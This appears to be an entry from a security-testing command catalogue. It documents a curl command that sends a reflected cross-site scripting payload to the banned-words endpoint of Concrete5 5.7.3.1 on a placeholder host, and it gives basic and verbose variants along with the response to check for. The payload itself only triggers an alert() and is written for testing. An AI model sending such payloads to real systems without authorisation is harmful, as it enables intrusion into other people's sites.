---
id: cmd-curl-xss-banned-001
data: >-
  curl -X POST -d
  'banned_word[]="--></style></scRipt><scRipt>alert(0x000936)</scRipt>'
  https://target.com/concrete5.7.3.1/index.php/dashboard/system/conversations/bannedwords/success
tags:
  - xss
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.927Z'
verified: false
validated: true
submitted: true
---
# curl-inject-xss-bannedwords

## Command

```bash
curl -X POST -d 'banned_word[]="--></style></scRipt><scRipt>alert(0x000936)</scRipt>' https://target.com/concrete5.7.3.1/index.php/dashboard/system/conversations/bannedwords/success
```

## Description

Sends a POST request to the Concrete5 banned words endpoint with a reflected XSS payload in the banned_word[] parameter to test for script injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | Data payload with encoded script | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'banned_word[]=test' https://target.com/concrete5.7.3.1/index.php/dashboard/system/conversations/bannedwords/success
```

### Advanced Usage

```bash
curl -X POST -d 'banned_word[]="--></style></scRipt><scRipt>alert(0x000936)</scRipt>' -v https://target.com/concrete5.7.3.1/index.php/dashboard/system/conversations/bannedwords/success
```

## Expected Output

HTTP response with HTML containing the reflected payload if vulnerable; look for unescaped <script> tags in the body.

## Related

- [[commands/curl-inject-xss-logs]]
- [[procedures/Exploit-Reflected-XSS-in-Concrete5-Parameters]]
